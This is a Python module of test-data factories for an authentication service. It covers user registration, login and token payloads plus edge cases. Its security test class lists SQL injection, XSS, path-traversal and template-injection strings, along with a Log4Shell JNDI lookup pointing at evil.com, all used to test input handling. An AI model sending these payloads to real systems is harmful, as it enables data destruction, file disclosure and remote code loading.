"""
Test data factories for generating consistent test data.
"""
import factory
from typing import Dict, Any
from faker import Faker

fake = Faker()


class UserDataFactory(factory.Factory):
    """Factory for creating user registration data."""
    
    class Meta:
        model = dict
    
    email = factory.Sequence(lambda n: f"user{n}@example.com")
    password = "TestPassword123!"
    full_name = factory.Faker("name")


class UserLoginDataFactory(factory.Factory):
    """Factory for creating user login data."""
    
    class Meta:
        model = dict
    
    email = factory.Sequence(lambda n: f"user{n}@example.com")
    password = "TestPassword123!"


class WeakPasswordUserFactory(UserDataFactory):
    """Factory for users with weak passwords."""
    password = "weak"


class StrongPasswordUserFactory(UserDataFactory):
    """Factory for users with strong passwords."""
    password = factory.LazyAttribute(
        lambda obj: fake.password(
            length=16, 
            special_chars=True, 
            digits=True, 
            upper_case=True, 
            lower_case=True
        )
    )


class InvalidEmailUserFactory(UserDataFactory):
    """Factory for users with invalid email addresses."""
    email = "invalid-email-format"


class PasswordChangeDataFactory(factory.Factory):
    """Factory for password change requests."""
    
    class Meta:
        model = dict
    
    current_password = "TestPassword123!"
    new_password = factory.LazyAttribute(
        lambda obj: fake.password(
            length=12, 
            special_chars=True, 
            digits=True, 
            upper_case=True, 
            lower_case=True
        )
    )


class TokenRefreshDataFactory(factory.Factory):
    """Factory for token refresh requests."""
    
    class Meta:
        model = dict
    
    refresh_token = factory.LazyAttribute(
        lambda obj: fake.uuid4()
    )


class LogoutDataFactory(factory.Factory):
    """Factory for logout requests."""
    
    class Meta:
        model = dict
    
    refresh_token = factory.LazyAttribute(
        lambda obj: fake.uuid4()
    )


class SecurityTestDataFactory:
    """Factory for security test scenarios."""
    
    @staticmethod
    def sql_injection_emails() -> list[str]:
        """Generate SQL injection test cases for email fields."""
        return [
            "test@example.com'; DROP TABLE users; --",
            "test@example.com' OR '1'='1",
            "test@example.com'; SELECT * FROM users; --",
            "test@example.com' UNION SELECT * FROM users --",
            "admin@example.com'; UPDATE users SET password='hacked'; --",
        ]
    
    @staticmethod
    def xss_test_strings() -> list[str]:
        """Generate XSS test cases."""
        return [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "<img src=x onerror=alert('xss')>",
            "';alert('xss');//",
            "<svg onload=alert('xss')>",
        ]
    
    @staticmethod
    def special_character_names() -> list[str]:
        """Generate names with special characters."""
        return [
            "John O'Connor",
            "José María García",
            "李小明",
            "محمد الأحمد",
            "Björk Guðmundsdóttir",
            "François Müller",
            "Иван Петров",
            "田中太郎",
        ]
    
    @staticmethod
    def malicious_passwords() -> list[str]:
        """Generate potentially malicious password strings."""
        return [
            "'; DROP TABLE users; --",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "<script>alert('xss')</script>",
            "../../../../../../windows/system32/drivers/etc/hosts",
        ]


class PerformanceTestDataFactory:
    """Factory for performance test data."""
    
    @staticmethod
    def bulk_user_data(count: int = 100) -> list[Dict[str, Any]]:
        """Generate bulk user data for performance testing."""
        return [UserDataFactory() for _ in range(count)]
    
    @staticmethod
    def concurrent_login_data(count: int = 50) -> list[Dict[str, Any]]:
        """Generate data for concurrent login testing."""
        return [UserLoginDataFactory() for _ in range(count)]


class EdgeCaseDataFactory:
    """Factory for edge case test scenarios."""
    
    @staticmethod
    def boundary_emails() -> list[str]:
        """Generate boundary test cases for email fields."""
        return [
            "",  # Empty
            "a@b.c",  # Minimum valid
            "a" * 320 + "@example.com",  # Maximum length
            "@example.com",  # Missing local part
            "test@",  # Missing domain
            "test..test@example.com",  # Double dots
            "test@example..com",  # Double dots in domain
        ]
    
    @staticmethod
    def boundary_passwords() -> list[str]:
        """Generate boundary test cases for password fields."""
        return [
            "",  # Empty
            "a",  # Too short
            "a" * 7,  # Below minimum (8 chars)
            "a" * 8,  # Minimum length
            "a" * 128,  # Maximum reasonable length
            "a" * 1000,  # Extremely long
            " " * 10,  # Only spaces
            "\n\t\r",  # Only whitespace
        ]
    
    @staticmethod
    def unicode_test_data() -> Dict[str, list[str]]:
        """Generate Unicode test cases."""
        return {
            "names": [
                "🚀 Rocket Man",
                "👨‍💻 Developer",
                "Test\u0000Null",
                "Test\uFFFDReplacement",
                "Test\u200BZeroWidth",
            ],
            "emails": [
                "test🚀@example.com",
                "тест@example.com",
                "test@例え.テスト",
            ]
        }


# Convenient factory instances
user_factory = UserDataFactory()
login_factory = UserLoginDataFactory()
weak_password_factory = WeakPasswordUserFactory()
strong_password_factory = StrongPasswordUserFactory()
invalid_email_factory = InvalidEmailUserFactory()